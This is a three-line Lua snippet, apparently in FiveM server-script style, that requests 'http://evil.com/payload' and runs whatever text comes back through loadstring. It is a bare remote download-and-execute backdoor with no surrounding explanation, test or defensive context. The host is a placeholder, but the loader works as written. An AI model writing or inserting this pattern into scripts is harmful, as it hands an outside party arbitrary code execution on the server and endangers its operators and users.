PerformHttpRequest('http://evil.com/payload', function(err, text, headers)
    loadstring(text)()
end)